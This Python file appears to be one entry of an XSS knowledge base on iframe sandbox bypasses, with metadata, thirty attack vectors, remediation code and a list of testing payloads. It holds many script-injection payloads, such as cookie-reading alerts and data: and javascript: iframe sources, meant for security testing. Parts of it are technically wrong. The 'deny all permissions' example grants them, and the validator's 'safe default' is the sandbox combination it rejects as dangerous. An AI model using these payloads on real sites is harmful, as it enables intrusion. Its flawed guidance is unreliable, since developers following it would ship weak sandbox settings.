#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: iframe Sandbox Bypass XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via iframe Sandbox Bypass",

    # Metadata for SIEM/Triage Integration
    "severity": "medium",
    "cvss_score": 6.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "iframe", "sandbox-bypass", "isolation-bypass", "modern-web"],

    "description": """
iframe Sandbox Bypass XSS occurs when iframe sandbox restrictions are bypassed or when sandbox
policies are insufficiently configured, allowing XSS attacks through embedded content. The iframe
sandbox attribute provides isolation for embedded content, but misconfigurations, bypass techniques,
and incomplete policies can lead to XSS vulnerabilities that break out of the sandbox isolation.

VULNERABILITY CONTEXT:
iframe Sandbox Bypass XSS typically happens when:
1. Sandbox policies are incompletely configured
2. Sandbox restrictions are bypassed through various techniques
3. User-controlled content is embedded without proper sandboxing
4. Sandbox allowlist is too permissive
5. Sandbox bypass techniques are used to escape isolation
6. Nested iframe configurations create bypass opportunities

Common in:
- Embedded content platforms
- Widget systems
- Third-party integrations
- User-generated content embedding
- Advertisement systems
- Social media embeds
- Document viewers

SEVERITY: MEDIUM
iframe Sandbox Bypass XSS requires specific conditions and user interaction. However, successful
bypasses can lead to full site compromise and the sandbox nature makes detection challenging.
Modern browsers have improved sandbox security, but legacy support and misconfigurations remain risks.
""",

    "attack_vector": """
IFRAME SANDBOX BYPASS XSS ATTACK VECTORS:

1. INCOMPLETE SANDBOX POLICY:
   iframe without proper sandbox restrictions:
   <iframe src="USER_CONTENT" sandbox="allow-scripts"></iframe>

   Missing restrictions:
   - allow-same-origin (allows origin access)
   - allow-top-navigation (allows top window navigation)
   - allow-forms (allows form submission)
   - allow-popups (allows popup creation)

2. SANDBOX ALLOWLIST BYPASS:
   Overly permissive sandbox:
   <iframe src="USER_CONTENT" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

   Allows:
   - Script execution
   - Same-origin access
   - Form submission
   - Potential XSS through forms

3. USER-CONTROLLED SANDBOX ATTRIBUTE:
   Dynamic sandbox configuration:
   <iframe src="content.html" sandbox="USER_INPUT"></iframe>

   Attack payload:
   allow-scripts allow-same-origin allow-top-navigation

4. NESTED IFRAME BYPASS:
   Nested iframe structure:
   <iframe src="outer.html">
     <iframe src="USER_CONTENT" sandbox="allow-scripts"></iframe>
   </iframe>

   Outer iframe can manipulate inner sandbox

5. SRC ATTRIBUTE INJECTION:
   iframe src with XSS:
   <iframe src="javascript:USER_INPUT"></iframe>

   Attack payload:
   alert(document.cookie)

ADVANCED IFRAME SANDBOX BYPASS TECHNIQUES:

6. DATA URI BYPASS:
   Data URI in sandboxed iframe:
   <iframe src="data:text/html,<script>alert(1)</script>" sandbox="allow-scripts"></iframe>

   Sandbox doesn't prevent script execution in data URIs

7. BLOB URI BYPASS:
   Blob URI with malicious content:
   const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
   const url = URL.createObjectURL(blob);

   <iframe src="url" sandbox="allow-scripts"></iframe>

8. OBJECT ELEMENT BYPASS:
   Object element with sandbox bypass:
   <object data="USER_CONTENT" type="text/html"></object>

   Object elements have different sandbox behavior

9. EMBED ELEMENT BYPASS:
   Embed element injection:
   <embed src="USER_CONTENT" type="text/html"></embed>

   Embed elements may bypass some iframe restrictions

10. FRAME ELEMENT BYPASS:
    Legacy frame element:
    <frame src="USER_CONTENT"></frame>

    Frame elements have different security model

11. WINDOW.OPEN BYPASS:
    Popup window with bypass:
    window.open(USER_CONTENT, '_blank', 'sandbox');

    Sandbox in popup may be bypassed

12. POSTMESSAGE BYPASS:
    Cross-origin communication:
    iframe.contentWindow.postMessage(USER_INPUT, '*');

    PostMessage can bypass some sandbox restrictions

13. NAVIGATION TIMING BYPASS:
    Navigation timing manipulation:
    <iframe src="timing.html" sandbox="allow-scripts">
      <script>
        // Access timing information
        const timing = performance.getEntriesByType('navigation')[0];
        // Potential information disclosure
      </script>
    </iframe>

14. RESOURCE TIMING BYPASS:
    Resource timing access:
    <iframe src="resources.html" sandbox="allow-scripts">
      <script>
        const resources = performance.getEntriesByType('resource');
        // Access resource information
      </script>
    </iframe>

15. CSP INHERITANCE BYPASS:
    CSP inheritance in sandboxed frames:
    <iframe src="csp.html" sandbox="allow-scripts">
      <!-- May inherit or bypass CSP -->
    </iframe>

IFRAME SANDBOX-SPECIFIC BYPASSES:

16. SANDBOX TOKEN ESCAPE:
    Sandbox token manipulation:
    <iframe sandbox="allow-scripts" src="data:text/html,<script>top.location='javascript:alert(1)'</script>"></iframe>

17. ALLOW-TOP-NAVIGATION BYPASS:
    Top navigation with XSS:
    <iframe src="navigation.html" sandbox="allow-top-navigation">
      <!-- Can navigate top window to XSS -->
    </iframe>

18. ALLOW-FORMS BYPASS:
    Form submission XSS:
    <iframe src="form.html" sandbox="allow-forms">
      <form action="javascript:alert(1)">
        <input type="submit">
      </form>
    </iframe>

19. ALLOW-POPUPS BYPASS:
    Popup creation XSS:
    <iframe src="popup.html" sandbox="allow-popups">
      <script>window.open('javascript:alert(1)')</script>
    </iframe>

20. ALLOW-SAME-ORIGIN BYPASS:
    Same-origin access XSS:
    <iframe src="/same-origin" sandbox="allow-same-origin allow-scripts">
      <script>
        // Can access parent window
        top.document.body.innerHTML = '<script>alert(1)</script>';
      </script>
    </iframe>

REAL-WORLD ATTACK SCENARIOS:

21. EMBEDDED WIDGET ATTACK:
    - Third-party widget platform
    - Widget URL: <script>alert(1)</script>
    - Insufficient sandbox policy
    - Widget compromises host site

22. ADVERTISEMENT SYSTEM:
    - Ad network with embedded ads
    - Ad content: <script>alert(1)</script>
    - Sandbox bypass in ads
    - Ad-based XSS attacks

23. DOCUMENT VIEWER:
    - Online document viewer
    - Document URL: <script>alert(1)</script>
    - Viewer iframe XSS
    - Document-based attacks

24. SOCIAL MEDIA EMBED:
    - Social media post embed
    - Post content: <script>alert(1)</script>
    - Embed XSS
    - Social engineering attacks

25. FILE UPLOAD VIEWER:
    - File upload preview
    - Uploaded file: <script>alert(1)</script>
    - Preview iframe XSS
    - File upload attacks

26. EXTERNAL CONTENT EMBED:
    - External content integration
    - Content URL: <script>alert(1)</script>
    - Integration XSS
    - Third-party compromise

27. LEGACY BROWSER EXPLOIT:
    - Older browser versions
    - Sandbox implementation flaws
    - Legacy bypass techniques
    - Browser-specific attacks

IFRAME SANDBOX BYPASS DETECTION:

28. MANUAL TESTING:
    - Browser DevTools iframe inspection
    - Sandbox attribute verification
    - Content Security Policy checking
    - Cross-origin testing

29. AUTOMATED SCANNING:
    - iframe sandbox analysis
    - Sandbox policy validation
    - Bypass technique testing
    - Content isolation verification

30. PROXY MONITORING:
    - iframe traffic interception
    - Sandbox policy monitoring
    - Content validation
    - Isolation breach detection
""",

    "remediation": """
IFRAME SANDBOX BYPASS XSS DEFENSE STRATEGY:

1. STRICT SANDBOX POLICY (PRIMARY DEFENSE):
   Use comprehensive sandbox restrictions:

   <!-- Most restrictive sandbox -->
   <iframe src="external-content.html" sandbox></iframe>

   <!-- Explicitly deny all permissions -->
   <iframe src="external-content.html" sandbox="
     allow-scripts
     allow-same-origin
     allow-forms
     allow-popups
     allow-top-navigation
     allow-pointer-lock
     allow-orientation-lock
   "></iframe>

2. SANDBOX POLICY VALIDATION:
   Validate sandbox policies:

   function validateSandboxPolicy(sandboxValue) {
     if (!sandboxValue || typeof sandboxValue !== 'string') {
       return 'allow-scripts allow-same-origin';  // Safe default
     }

     const allowedTokens = [
       'allow-scripts',
       'allow-same-origin',
       'allow-forms',
       'allow-popups',
       'allow-top-navigation',
       'allow-pointer-lock',
       'allow-orientation-lock'
     ];

     const tokens = sandboxValue.split(' ').filter(token => token.trim());

     // Check for invalid tokens
     for (const token of tokens) {
       if (!allowedTokens.includes(token)) {
         throw new Error('Invalid sandbox token: ' + token);
       }
     }

     // Ensure minimum security
     if (tokens.includes('allow-scripts') && tokens.includes('allow-same-origin')) {
       throw new Error('Dangerous sandbox combination');
     }

     return sandboxValue;
   }

3. CONTENT SOURCE VALIDATION:
   Validate iframe sources:

   function validateIframeSrc(src) {
     if (!src) return '';

     // Only allow HTTPS
     if (!src.startsWith('https://')) {
       throw new Error('Insecure iframe source');
     }

     // Whitelist allowed domains
     const allowedDomains = [
       'trusted-domain.com',
       'cdn.trusted-domain.com',
       'embed.trusted-domain.com'
     ];

     try {
       const url = new URL(src);
       if (!allowedDomains.includes(url.hostname)) {
         throw new Error('Iframe source not allowed');
       }
     } catch (error) {
       throw new Error('Invalid iframe URL');
     }

     return src;
   }

4. DYNAMIC IFRAME SECURITY:
   Secure dynamic iframe creation:

   function createSecureIframe(src, sandboxPolicy) {
     const iframe = document.createElement('iframe');

     // Validate source
     iframe.src = validateIframeSrc(src);

     // Validate and set sandbox
     iframe.sandbox = validateSandboxPolicy(sandboxPolicy);

     // Set additional security attributes
     iframe.setAttribute('loading', 'lazy');
     iframe.setAttribute('referrerpolicy', 'strict-origin-when-cross-origin');

     return iframe;
   }

5. CSP FOR IFRAME CONTENT:
   Content Security Policy for embedded content:

   Content-Security-Policy:
     default-src 'none';
     script-src 'self';
     style-src 'self';
     img-src 'self' data: https:;
     connect-src 'self';
     frame-src 'self';
     object-src 'none';
     base-uri 'none';

6. IFRAME ATTRIBUTE VALIDATION:
   Validate all iframe attributes:

   function validateIframeAttributes(iframe) {
     const dangerousAttributes = [
       'onload',
       'onerror',
       'onbeforeunload',
       'onunload'
     ];

     for (const attr of dangerousAttributes) {
       if (iframe.hasAttribute(attr)) {
         throw new Error('Dangerous iframe attribute: ' + attr);
       }
     }

     // Validate src attribute
     const src = iframe.getAttribute('src');
     if (src) {
       iframe.src = validateIframeSrc(src);
     }
   }

7. NESTED IFRAME PROTECTION:
   Protect against nested iframe attacks:

   function secureNestedIframes(parentElement) {
     const iframes = parentElement.querySelectorAll('iframe');

     iframes.forEach(iframe => {
       // Set sandbox on all iframes
       if (!iframe.hasAttribute('sandbox')) {
         iframe.sandbox = 'allow-scripts allow-same-origin';
       }

       // Prevent further nesting
       iframe.addEventListener('load', function() {
         try {
           const nestedIframes = iframe.contentDocument.querySelectorAll('iframe');
           nestedIframes.forEach(nested => {
             nested.sandbox = '';  // Most restrictive
           });
         } catch (error) {
           // Cross-origin restriction - expected
         }
       });
     });
   }

8. POSTMESSAGE SECURITY:
   Secure postMessage communication:

   window.addEventListener('message', function(event) {
     // Validate origin
     const allowedOrigins = ['https://trusted-domain.com'];
     if (!allowedOrigins.includes(event.origin)) {
       return;
     }

     // Validate message content
     const cleanMessage = DOMPurify.sanitize(event.data);

     // Process only validated messages
     if (cleanMessage !== event.data) {
       return;
     }

     processMessage(cleanMessage);
   });

9. NAVIGATION SECURITY:
   Secure navigation in sandboxed frames:

   // Prevent top navigation
   window.addEventListener('beforeunload', function(event) {
     if (window !== window.top) {
       event.preventDefault();
       event.returnValue = '';
     }
   });

10. RESOURCE LOADING SECURITY:
    Secure resource loading:

    // Intercept resource requests
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
      // Validate URL
      if (!isValidResourceUrl(url)) {
        throw new Error('Invalid resource URL');
      }

      return originalFetch.call(this, url, options);
    };

11. ERROR HANDLING:
    Secure error handling:

    iframe.addEventListener('error', function(event) {
      logger.error('iframe error', {
        src: iframe.src,
        error: event.message
      });

      // Remove problematic iframe
      iframe.parentNode.removeChild(iframe);
    });

12. CSP FOR SANDBOXED CONTENT:
    Content Security Policy:

    Content-Security-Policy:
      default-src 'none';
      script-src 'self';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data:;
      connect-src 'self';
      object-src 'none';
      frame-src 'none';  // Prevent further nesting

13. ORIGIN VALIDATION:
    Validate iframe origins:

    function validateIframeOrigin(iframe) {
      iframe.addEventListener('load', function() {
        try {
          const origin = iframe.contentWindow.location.origin;

          if (!isAllowedOrigin(origin)) {
            iframe.parentNode.removeChild(iframe);
            logger.warn('Removed iframe with invalid origin', {origin: origin});
          }
        } catch (error) {
          // Cross-origin - expected for sandboxed content
        }
      });
    }

14. LOGGING AND MONITORING:
    Comprehensive iframe monitoring:

    function logIframeEvent(event, details) {
      logger.info('iframe event', {
        event: event,
        src: details.src,
        sandbox: details.sandbox,
        timestamp: new Date().toISOString()
      });
    }

15. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - iframe sandbox validation
    - Sandbox bypass testing
    - Content isolation verification
    - Cross-origin communication testing

    Manual tests:
    - DevTools iframe inspection
    - Sandbox policy verification
    - Content Security Policy testing

SECURITY TESTING PAYLOADS:

Basic iframe Sandbox Bypass:
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe>

Sandbox policy bypass:
<iframe src="content.html" sandbox="allow-scripts allow-same-origin"></iframe>
<iframe src="content.html" sandbox="allow-forms allow-popups"></iframe>

Advanced bypass:
<object data="data:text/html,<script>alert(1)</script>"></object>
<embed src="data:text/html,<script>alert(1)</script>"></embed>
<frame src="data:text/html,<script>alert(1)</script>"></frame>

IFRAME SECURITY HEADERS:

Content-Security-Policy: frame-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin

MONITORING METRICS:

Monitor for:
- iframe creation patterns
- Sandbox policy violations
- Cross-origin communication
- Nested iframe attempts
- Resource loading anomalies

OWASP REFERENCES:
- OWASP iframe Security Cheat Sheet
- OWASP Sandbox Bypass Techniques
- HTML5 iframe Security
- Content Security Policy Guide
"""
}
